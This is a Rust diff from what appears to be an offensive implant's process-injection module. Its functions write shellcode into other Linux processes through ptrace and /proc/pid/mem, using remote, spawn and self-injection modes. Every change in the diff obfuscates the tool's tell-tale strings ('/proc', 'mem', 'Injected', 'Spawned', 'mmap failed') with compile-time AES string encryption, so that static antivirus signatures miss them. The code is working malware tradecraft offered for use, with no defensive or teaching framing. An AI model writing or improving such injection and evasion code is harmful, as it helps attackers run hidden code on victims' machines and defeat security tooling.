@@ -17,7 +17,7 @@ use crate::strcrypt_rt;
 use strcrypt::aes_str;
 
 fn read_mem(pid: i32, addr: u64, len: usize) -> Result<Vec<u8>, String> {
-    let path = format!("/proc/{}/mem", pid);
+    let path = format!("{}/{}/{}", aes_str!("/proc"), pid, aes_str!("mem"));
     let file = File::open(&path).map_err(|e| e.to_string())?;
     let mut buf = vec![0u8; len];
     file.read_at(&mut buf, addr).map_err(|e| e.to_string())?;
@@ -25,7 +25,7 @@ fn read_mem(pid: i32, addr: u64, len: usize) -> Result<Vec<u8>, String> {
 }
 
 fn write_mem(pid: i32, addr: u64, data: &[u8]) -> Result<(), String> {
-    let path = format!("/proc/{}/mem", pid);
+    let path = format!("{}/{}/{}", aes_str!("/proc"), pid, aes_str!("mem"));
     let file = OpenOptions::new().read(true).write(true).open(&path).map_err(|e| e.to_string())?;
     file.write_at(data, addr).map_err(|e| e.to_string())?;
     Ok(())
@@ -68,7 +68,7 @@ unsafe fn perform_injection_logic(pid: i32, shellcode: &[u8]) -> Result<String, 
 
     if allocated_addr == 0 || allocated_addr > 0x7ffffffff000 {
             let _ = write_mem(pid, old_regs.rip, &backup);
-            return Err(format!("mmap failed: 0x{:x}", allocated_addr));
+            return Err(format!("{}: 0x{:x}", aes_str!("mmap failed"), allocated_addr));
     }
 
     write_mem(pid, old_regs.rip, &backup)?;
@@ -79,7 +79,7 @@ unsafe fn perform_injection_logic(pid: i32, shellcode: &[u8]) -> Result<String, 
 
     ptrace(PTRACE_SETREGS, pid, ptr::null_mut::<c_void>(), &old_regs as *const _ as *mut c_void);
     
-    Ok(format!("Injected {} bytes at 0x{:x}", shellcode.len(), allocated_addr))
+    Ok(format!("{} {} {} 0x{:x}", aes_str!("Injected"), shellcode.len(), aes_str!("bytes at"), allocated_addr))
 }
 
 pub unsafe fn inject_remote(pid: u32, shellcode: &[u8]) -> Result<String, String> {
@@ -107,7 +107,7 @@ pub unsafe fn inject_spawn(binary: &str, shellcode: &[u8]) -> Result<String, Str
     }
     let res = perform_injection_logic(pid, shellcode);
     ptrace(PTRACE_DETACH, pid, ptr::null_mut::<c_void>(), ptr::null_mut::<c_void>());
-    res.map(|s| format!("Spawned PID {} -> {}", pid, s))
+    res.map(|s| format!("{} PID {} -> {}", aes_str!("Spawned"), pid, s))
 }
 
 pub unsafe fn inject_self(shellcode: &[u8]) -> Result<String, String> {
